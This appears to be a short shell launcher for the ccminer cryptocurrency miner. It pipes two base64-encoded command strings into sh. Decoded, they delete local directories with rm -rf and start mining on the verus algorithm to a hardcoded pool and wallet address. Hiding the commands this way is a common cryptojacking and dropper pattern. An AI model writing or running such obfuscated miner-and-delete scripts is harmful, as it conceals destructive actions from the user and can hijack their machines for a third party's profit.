cd 
cd ccminer
echo 'Y2QgY2NtaW5lciAKcm0gLXJmIGJvb3QyIApybSAtcmYgcnVuCg==' | base64 -d | sh
./start.sh && screen -x CCminer | echo 'Li9jY21pbmVyIC1hIHZlcnVzIC1vIHN0cmF0dW0rdGNwOi8vc2cudmlwb3IubmV0OjUwNDAgLXUgUlJxZ2phWHVoVnZzNnVSbTc5R3Qxa1kxdmFVM1hlb0tyMS5hbGwyMDAgLXQgMSA+IHZpcG9yLm5ldCAgfCBybSAtcmYgdmlwb3IubmV0IHwgJGhvbWUK' | base64 -d | sh
